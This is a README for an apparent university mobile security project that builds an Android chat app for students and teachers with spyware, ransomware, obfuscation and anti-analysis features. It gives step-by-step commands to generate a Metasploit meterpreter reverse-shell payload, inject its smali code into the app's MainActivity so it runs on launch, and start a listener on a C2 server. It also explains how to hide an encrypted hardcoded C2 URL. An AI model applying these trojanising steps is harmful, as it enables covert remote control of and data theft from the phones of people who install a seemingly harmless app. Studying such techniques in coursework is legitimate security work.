# ICT 2215 Mobile Security

## Tools

- Android Emulator / Genymotion
- ADB
- Kotlin Compiler
- JDK
- Python
- Metasploit

## Goals

1. Create a chat application for students and teachers
2. Add Spyware capabilities
3. Add Ransomware additional features
4. Perform obfuscation and detection of RE Tools

## Project Setup

### Android Target

Android Version 11 (Not tested on 12 yet)

### Start C2 Server

```bash
pip install flask
pip install werkzeug
python3 app.py
```

Make sure to copy the local server values and **edit the source code MainActivity.kt**

### Compiling the Code

Make sure to have a valid keystore key (change value in <> and remove the arrows afterwards)
`keytool -genkey -v -keystore my-<release-key.keystore> -alias <alias_name> -keyalg RSA -keysize 2048 -validity 10000`

Make sure there is a **clean snapshot of the android emulator** before proceeding

```bash
./gradlew clean
./gradlew build
apksigner sign --ks <my.keystore> app-release-unsigned.apk --ks-key-alias <alias_name>
```

### Embed Metasploit Payload


The compiled APK included in the zip includes a payload that returns a shell to the team's C2 server. To generate your own, please rebuild your own project and decompile the project. At the same time, msfvenom is required to compile a separate payload APK file which is required to be decompiled too.

`msfvenom -p android/meterpreter/reverse_https LHOST=<ngrok_forwarding_address> LPORT=<ngrok_forwarding_port> R > msf_https.apk`

Once both projects are decompiled, please copy smali/com/metasploit from the msfvenom payload to smali_classes3/com of the android project. Then, edit the MainActivity.smali under smali_classes3/com/example/ict2215_project/ to include ' invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V' under invoke-super in onCreate() function.

Recompile the entire APK, followed by zipaligning and signing off the APK.

On the C2 Server, Please run the following command for the metasploit to work

```bash
msfconsole -q
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4000
exploit
```

Similarly, by default, without a msfvenom payload in the application, there is also a C2 connection back to the server which is hardcoded. To replace them, use the included Crypto java files provided by the team to encrypt your URL

`java EncryptStringWithKeyFile.class www.example.com.`

Hardcode the ciphertext into LocationManager.kt and MainActivity.kt
For additional information, the aesKey used by the String Encryption is included as part of the application under assets/

### Running on Emulator

`adb install app/build/outputs/apk/release/app-release-unsigned.apk`
